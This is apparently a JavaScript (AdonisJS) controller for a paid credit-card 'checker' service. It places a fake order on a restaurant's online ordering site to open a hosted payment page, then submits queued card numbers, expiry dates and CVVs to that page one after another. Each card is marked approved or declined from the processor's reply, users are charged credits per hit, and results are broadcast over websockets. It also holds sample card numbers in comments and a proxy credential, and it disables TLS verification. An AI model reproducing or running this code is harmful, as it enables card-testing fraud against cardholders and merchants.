'use strict'
const Ws = use('Ws')
const { Curl } = require('node-libcurl');
const Database = use('Database')
const User = use('App/Models/User')
const { addDays, parseISO } = require("date-fns");
const Cache = use('Cache')
const Redis = use('Redis')
class ValidateCardController {
    //função que pegar o codigo da url do link de checkout
    async GetId(id) {
        try {

            //verificar se o captcha já foi resolvido
            let contadorCaptcha = 0
            let time = setInterval(async () => {
                contadorCaptcha++
                console.log('VERIFICANDO TOKEN_RECAPTCHA....')


                // se ouver algum erro na resolução do captcha para tudo e recomeçar
                if (await Cache.has('user_id:' + id + '#erro_recaptcha#')) {
                    //deletar contador recaptcha
                    await Cache.pull(id + '#contador_captcha#')
                    // deleta o token recaptcha já resolvido e expirado
                    await Cache.forget('user_id:' + id + '#token_recaptcha#')
                    //deleta o erro de token recaptcha se existir
                    await Cache.forget('user_id:' + id + '#erro_recaptcha#')
                    // seta o valor true para continuar a validação
                    await Cache.forever('user_id:' + id + '#restart#', 1)
                    clearInterval(time)
                    console.log('erro na verificação do tokens')
                }

                //verifica se o token já foi resolvido

                if (await Cache.has('user_id:' + id + '#token_recaptcha#')) {

                    //pega o token já resolvido
                    let token = await JSON.parse(await Cache.get('user_id:' + id + '#token_recaptcha#'))
                    //pega o erro de resolução do token se existi
                    let error = await JSON.parse(await Cache.get('user_id:' + id + '#erro_recaptcha#'))
                    if (token != null && error == null) {
                        // zera a verifição do token recaptcha
                        clearInterval(time)
                        //função que enviar o form para o site e gravar o codigo da url do chechout
                        //#####
                        await this.EnviarForm(id, token)
                        //#####
                        //função que pegar os tres campos para proxima request POST

                    }
                }

                console.log(contadorCaptcha)

            }, 5000);

        } catch (error) {
            await Cache.forever('user_id:' + id + '#log#type:GetId#', JSON.stringify(error.message))
        }

    }
    // função que envia o form via post
    async EnviarForm(id, token) {
        try {

            const date = await this.Pickup_time();
            const curl = new Curl();
            curl.setOpt('URL', 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
            //curl.setOpt('PROXY', 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010');
            curl.setOpt('HEADER', 1);
            curl.setOpt('FOLLOWLOCATION', 1);
            curl.setOpt(Curl.option.POST, 1);
            curl.setOpt('SSL_VERIFYPEER', 0);
            curl.setOpt('SSL_VERIFYHOST', 0);
            curl.setOpt(Curl.option.IGNORE_CONTENT_LENGTH, 136);
            curl.setOpt(Curl.option.HTTPHEADER, [
                'Host: amarithcafe.revelup.com',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
                'Accept: application/json',
                'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1',
                'Content-Type: application/x-www-form-urlencoded',
                'Connection: keep-alive']
            );

            curl.setOpt(Curl.option.POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"' + date.create_date + '","pickup_time":"' + date.pickup_time + '","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}');
            //pega o rsultado da request POST com o form enviado
            await curl.on('end', async (statusCode, data) => {
                //verifica se teve error.
                //console.log(data)
                if (data.indexOf("\"status\": \"ERROR\"") != -1) {
                    console.log('error')
                    await Redis.keys('*', async (error, result) => {
                        if (error) {
                            console.log(error);
                            throw error;
                        }
                        for (let index = 0; index < result.length; index++) {
                            let t = await result[index]
                            let i = await t.indexOf("user_id:" + id + "#")

                            if (i != -1) {
                                await Redis.del(result[index]);
                            }
                        }
                    });

                    await Cache.forever('user_id:' + id + '#restart#', 1)
                    await Cache.forever('user_id:' + id + '#erro_codigo_url#', JSON.stringify('ERROR'))

                } else {
                    let inicio = data.indexOf("\"TransactionSetupID\": \"");
                    let codigo_url = await data.substr(inicio + 23, 36)
                    // salvar o codigo da url
                    await Cache.forever('user_id:' + id + '#codigo_url#', JSON.stringify(codigo_url))
                    // deleta o token recaptcha já expirado e usado
                    await Cache.forget('user_id:' + id + '#token_recaptcha#')
                    await this.GetCampos(id)
console.log(codigo_url)
                    console.log('codigo da url pego com sucesso')

                }
            });
            // encerra o curl desta requisição
            curl.on('error', curl.close.bind(curl))
            curl.perform()

        } catch (error) {
            await Redis.keys('*', async (error, result) => {
                if (error) {
                    console.log(error);
                    throw error;
                }
                for (let index = 0; index < result.length; index++) {
                    let t = await result[index]
                    let i = await t.indexOf("user_id:" + id + "#")

                    if (i != -1) {
                        await Redis.del(result[index]);
                    }
                }
            });

            await Cache.forever('user_id:' + id + '#restart#', 1)


            await Cache.forever('user_id:' + id + '#log#type:EnviarForm#', JSON.stringify(error.message))
        }

    }
    // essa função pegar data dinamica para colocar nas ordens
    async Pickup_time() {
        let day = new Date().getDay();
        let dd = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
        let ff = parseISO(dd[0] + 'T15:45:00')
        let tt = addDays(ff, 1)
        let pickup_time = tt.toISOString().replace(/\.\d{3}Z$/, '');
        let create_date = new Date().toISOString().replace(/\.\d{3}Z$/, '');

        if (day != 6 && day != 7 && day == 5) {
            let d = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
            let f = parseISO(d[0] + 'T15:45:00')
            let t = addDays(f, 3)
            pickup_time = t.toISOString().replace(/\.\d{3}Z$/, '');

        }
        if (day == 6 || day == 7) {
            let d = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
            let f = parseISO(d[0] + 'T15:45:00')
            let t = addDays(f, 2)
            pickup_time = t.toISOString().replace(/\.\d{3}Z$/, '');

        }
        return { pickup_time: pickup_time, create_date: create_date }
    }
    // essa função pega os tres campos state, viewstate e validaton
    async GetCampos(id) {
        try {

            let code_url = JSON.parse(await Cache.get('user_id:' + id + '#codigo_url#'));
            const curl1 = new Curl();
            curl1.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');
            curl1.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
            curl1.setOpt('FOLLOWLOCATION', 1);
            curl1.setOpt('SSL_VERIFYPEER', 0);
            curl1.setOpt('SSL_VERIFYHOST', 0);
            curl1.setOpt(Curl.option.HTTPHEADER, [
                'Host: transaction.hostedpayments.com',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1',
            ]);

            await curl1.on('end', async (statusCode, data) => {

                let GETVIEWSTATE = data.indexOf('name="__VIEWSTATE" id="__VIEWSTATE" value="'); //47
                let GETVIEWSTATEGENERATOR = data.indexOf('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'); //64
                let GETEVENTVALIDATION = data.indexOf('name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="');//59

                let FinalVIEWSTATE = await data.indexOf('"', GETVIEWSTATE + 44);
                let FinalVIEWSTATEGENERATOR = await data.indexOf('"', GETVIEWSTATEGENERATOR + 62);
                let FinalEVENTVALIDATION = await data.indexOf('"', GETEVENTVALIDATION + 56);

                let STATE = await encodeURIComponent(data.substr(GETVIEWSTATE + 43, FinalVIEWSTATE - (GETVIEWSTATE + 43)))
                let STATEGENERATOR = await encodeURIComponent(data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                let EVENTVALIDATION = await encodeURIComponent(data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))
                //chamar função de valida o card
                // grava os campos no cache
                await Cache.forever('user_id:' + id + '#campos_form#state#', JSON.stringify(STATE))
                await Cache.forever('user_id:' + id + '#campos_form#generator#', JSON.stringify(STATEGENERATOR))
                await Cache.forever('user_id:' + id + '#campos_form#validation#', JSON.stringify(EVENTVALIDATION))
                // essa função valida os cards
                await this.ValidCard(id)
            });
            curl1.on('error', curl1.close.bind(curl1))
            curl1.perform()
            console.log('Get campos ok')

        } catch (error) {
            await Redis.keys('*', async (error, result) => {
                if (error) {
                    console.log(error);
                    throw error;
                }
                for (let index = 0; index < result.length; index++) {
                    let t = await result[index]
                    let i = await t.indexOf("user_id:" + id + "#")

                    if (i == -1) {
                        await Redis.del(result[index]);
                    }
                }
            });

            await Cache.forever('user_id:' + id + '#restart#', 1)
            await Cache.forever('user_id:' + id + '#log#type:GetCampos#', JSON.stringify(error.message))
        }


    }
    async ValidCard(id) {

        let time;
        try {

            // pegar os canais para enviar as menssagens
            const aprovadas = await Ws.getChannel('status:*').topic('status:a' + id)
            const reprovadas = await Ws.getChannel('status:*').topic('status:r' + id)
            const testadas = await Ws.getChannel('status:*').topic('status:t' + id)
            const creditos = await Ws.getChannel('status:*').topic('status:cred' + id)
            //pegar os campos cadastrados no cache
            let STATE = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#state#'));
            let STATEGENERATOR = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#generator#'));
            let EVENTVALIDATION = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#validation#'));
            //pegar o code_link do banco de dados
            let code_url = await JSON.parse(await Cache.get('user_id:' + id + '#codigo_url#'))

            //6509079001410445|12|2024|778
            //6504867262783814|06|2023|000
            //6504867262787880|06|2023|000
            if (await Cache.has('user_id:' + id + '#codigo_url#')
                && await Cache.has('user_id:' + id + '#campos_form#validation#')
                && await Cache.has('user_id:' + id + '#campos_form#generator#')
                && await Cache.has('user_id:' + id + '#campos_form#state#')
                && await Cache.has('user_id:' + id + '#resolvecards#')
            ) {

                time = setInterval(async () => {
                    // pegar o codedigo da url que esta no banco de dados
                    let card_number = await Cache.get('user_id:' + id + '#resolvecards#');
                    let card = await JSON.parse(await Cache.get('user_id:' + id + '#card#' + 'card_id:' + card_number))
                  
                    if (card_number == await Cache.get('user_id:' + id + '#contadorcard#')) {
                        clearInterval(time)
                        await Cache.forever('user_id:' + id + '#restart#', 0)
                    } else {
                        if (card.n) {
                            const curl2 = new Curl();

                            let PostString = await 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' + STATE + '&__VIEWSTATEGENERATOR=' + STATEGENERATOR + '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' + EVENTVALIDATION + '&hdnCancelled=&cardNumber=' + card.n + '&ddlExpirationMonth=' + card.m + '&ddlExpirationYear=' + card.a + '&CVV=' + card.v + '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&'

                            curl2.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');

                            curl2.setOpt('HEADER', 1);
                            curl2.setOpt(Curl.option.POST, 1);
                            curl2.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
                            curl2.setOpt('FOLLOWLOCATION', 1);
                            curl2.setOpt('SSL_VERIFYPEER', 0);
                            curl2.setOpt('SSL_VERIFYHOST', 0);
                            curl2.setOpt('CONNECTTIMEOUT', 2);
                            curl2.setOpt('FAILONERROR', 1);
                            curl2.setOpt(Curl.option.HTTPHEADER, [
                                'Host: transaction.hostedpayments.com',
                                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                                'Accept: */*',
                                'X-Requested-With: XMLHttpRequest',
                                'X-MicrosoftAjax: Delta=true',
                                'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
                                'Connection: keep-alive',
                                'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '',
                            ]);

                            curl2.setOpt(Curl.option.POSTFIELDS, PostString)
                            await curl2.on('end', async (statusCode, data) => {

                                let GETR = await data.indexOf('<b>Error</b>:');
                                let ENDR = await data.indexOf('</span>', GETR + 12);
                                const result = await data.substr(GETR + 13, ENDR - (GETR + 13))

                                console.log(result)
                                if (card_number != await Cache.get('user_id:' + id + '#contadorcard#')) {

                                    switch (result.trim()) {
                                        case 'Call Issuer':
                                            const credd = await User.find(id)
                                            if (credd.balance == 0) {
                                                break;
                                            }
                                            await Cache.increment('user_id:' + id + '#resolvecards#')

                                            await Database
                                                .table('users')
                                                .where('id', id)
                                                .decrement('balance', 1)


                                            await Cache.increment('user_id:' + id + '#aprovadas#')
                                            await Cache.increment('user_id:' + id + '#testadas#')
                                            if (aprovadas) {
                                                let cont = await Cache.get('user_id:' + id + '#aprovadas#')
                                                aprovadas.broadcastToAll('message', { cont: cont, msg: '<center><b class="badge badge-primary remov">#Aprovada</b> <b class="badge badge-light remov">' + card.n + '|' + card.m + '|' + card.aa + '|' + card.vv + '</b> <b class="badge badge-info remov">Retorno: Válido</b> <b class="badge badge-success remov">#el-patron</b><br></center>' })
                                            }
                                            if (testadas) {
                                                let cont = await Cache.get('user_id:' + id + '#testadas#')
                                                testadas.broadcastToAll('message', cont)
                                            }
                                            if (creditos) {

                                                const b = await User.find(id)
                                                await creditos.broadcastToAll('message', b.balance)
                                            }
                                            await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
                                            break;


                                        case 'TransactionSetupID expired':
                                            clearInterval(time)
                                            await Cache.forever('user_id:' + id + '#restart#', 1)

                                            break;

                                        default:
                                            await Cache.increment('user_id:' + id + '#resolvecards#')
                                            await Cache.increment('user_id:' + id + '#reprovadas#')
                                            await Cache.increment('user_id:' + id + '#testadas#')
                                            if (reprovadas) {
                                                let cont = await Cache.get('user_id:' + id + '#reprovadas#')
                                                reprovadas.broadcastToAll('message', { cont: cont, msg: '<center><b class="badge badge-danger remov">#Reprovada</b> <b class="badge badge-light remov">' + card.n + '|' + card.m + '|' + card.aa + '|' + card.vv + '</b> <b class="badge badge-danger remov">Retorno: Inválido</b><br></center>' })
                                            }
                                            if (testadas) {
                                                let cont = await Cache.get('user_id:' + id + '#testadas#')
                                                testadas.broadcastToAll('message', cont)
                                            }
                                            await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
                                            break;
                                    }
                                }

                            });

                            curl2.on('error', curl2.close.bind(curl2))
                            curl2.perform()
                        }
                    }

                }, 4000);


            }

        } catch (error) {
            await Redis.keys('*', async (error, result) => {
                if (error) {
                    console.log(error);
                    throw error;
                }
                for (let index = 0; index < result.length; index++) {
                    let t = await result[index]
                    let i = await t.indexOf("user_id:" + id + "#")

                    if (i == -1) {
                        await Redis.del(result[index]);
                    }
                }
            });

            await Cache.forever('user_id:' + id + '#restart#', 1)
            await Cache.forever('user_id:' + id + '#log#type:ValidCard#', JSON.stringify(error.message))
        }

    }

}

module.exports = ValidateCardController
